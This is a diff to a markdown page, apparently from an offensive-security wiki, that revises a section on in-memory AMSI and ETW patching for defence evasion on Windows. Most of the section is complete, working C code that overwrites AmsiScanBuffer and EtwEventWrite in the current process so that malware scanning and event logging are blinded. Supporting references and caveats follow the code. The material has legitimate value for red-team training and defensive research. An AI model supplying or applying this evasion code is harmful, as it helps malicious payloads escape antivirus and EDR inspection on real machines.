@@ -195,35 +195,45 @@ sedebug-+-seimpersonate-copy-token.md
 ---
 
 ## In-Memory AMSI & ETW Patch (Defence Evasion)
-Most modern AV/EDR engines rely on **AMSI** and **ETW** to inspect malicious behaviours.  Patching both interfaces early inside the current process prevents script-based payloads (e.g. PowerShell, JScript) from being scanned.<sup>[[2]](#references)</sup>
+
+This x64 example patches two current-process exports. `AmsiScanBuffer` returns an `HRESULT`, while `EtwEventWrite` returns a Win32 status. The two stubs therefore use different return values: an AMSI error versus zero for an ETW call that reports success without emitting the event.<sup>[[8]](#references)[[9]](#references)</sup>
+
+These entry-point patches do not disable scanning or logging in a newly spawned PowerShell process, and they do not prove that every AMSI or ETW path was intercepted.<sup>[[7]](#references)</sup> See the wider [AMSI](../av-bypass.md#amsi-anti-malware-scan-interface) and [ETW](../av-bypass.md#etw) sections for related techniques.
+
+<details>
+<summary>Process-local x64 AMSI and ETW patch example</summary>
 
 ```c
-// gcc -o patch_amsi.exe patch_amsi.c -lntdll
-#define _CRT_SECURE_NO_WARNINGS
+// x86_64-w64-mingw32-gcc -o patch_amsi.exe patch_amsi.c
 #include <windows.h>
-#include <stdio.h>
+#include <string.h>
 
-void Patch(BYTE *address) {
+void Patch(BYTE *address, const BYTE *bytes, SIZE_T length) {
     DWORD oldProt;
-    // mov eax, 0x80070057 ; ret  (AMSI_RESULT_E_INVALIDARG)
-    BYTE patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
-    VirtualProtect(address, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProt);
-    memcpy(address, patch, sizeof(patch));
-    VirtualProtect(address, sizeof(patch), oldProt, &oldProt);
+    if (!VirtualProtect(address, length, PAGE_EXECUTE_READWRITE, &oldProt)) return;
+    memcpy(address, bytes, length);
+    FlushInstructionCache(GetCurrentProcess(), address, length);
+    VirtualProtect(address, length, oldProt, &oldProt);
 }
 
 int main(void) {
-    HMODULE amsi  = LoadLibraryA("amsi.dll");
+    HMODULE amsi = LoadLibraryA("amsi.dll");
     HMODULE ntdll = GetModuleHandleA("ntdll.dll");
-
-    if (amsi)  Patch((BYTE*)GetProcAddress(amsi,  "AmsiScanBuffer"));
-    if (ntdll) Patch((BYTE*)GetProcAddress(ntdll, "EtwEventWrite"));
-
-    MessageBoxA(NULL, "AMSI & ETW patched!", "OK", MB_OK);
+    const BYTE amsiPatch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 }; // E_INVALIDARG; ret
+    const BYTE etwPatch[] = { 0x31, 0xC0, 0xC3 }; // xor eax,eax; ret
+    if (amsi) {
+        BYTE *p = (BYTE *)GetProcAddress(amsi, "AmsiScanBuffer");
+        if (p) Patch(p, amsiPatch, sizeof(amsiPatch));
+    }
+    if (ntdll) {
+        BYTE *p = (BYTE *)GetProcAddress(ntdll, "EtwEventWrite");
+        if (p) Patch(p, etwPatch, sizeof(etwPatch));
+    }
     return 0;
 }
 ```
-*The patch above is process-local; spawning a new PowerShell after running it will execute without AMSI/ETW inspection.*
+
+</details>
 
 ---
 
@@ -333,5 +343,8 @@ Minimal fix-up for a weaponized build: map an RWX section with `VirtualAlloc`, c
 - [4] [UpdateProcThreadAttribute function (Win32 apps) - Microsoft Learn](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-updateprocthreadattribute)
 - [5] [Novel Exploit Chain Enables Windows UAC Bypass](https://www.darkreading.com/vulnerabilities-threats/exploit-chain-windows-uac-bypass)
 - [6] [Lazarus and the FudModule Rootkit: Beyond BYOVD with an Admin-to-Kernel Zero-Day](https://www.gendigital.com/blog/insights/research/lazarus-and-the-fudmodule-rootkit-beyond-byovd-with-an-admin-to-kernel-zero-day)
+- [7] [Morphisec – From Business Emails to XLoader: An Order Lure That Led to In-Memory Injection](https://www.morphisec.com/blog/from-business-emails-to-xloader-an-order-lure-that-led-to-in-memory-injection/)
+- [8] [Microsoft Learn – AmsiScanBuffer function](https://learn.microsoft.com/en-us/windows/win32/api/amsi/nf-amsi-amsiscanbuffer)
+- [9] [Microsoft Learn – EtwEventWrite function](https://learn.microsoft.com/en-us/windows/win32/devnotes/etweventwrite)
 
 {{#include ../../banners/hacktricks-training.md}}
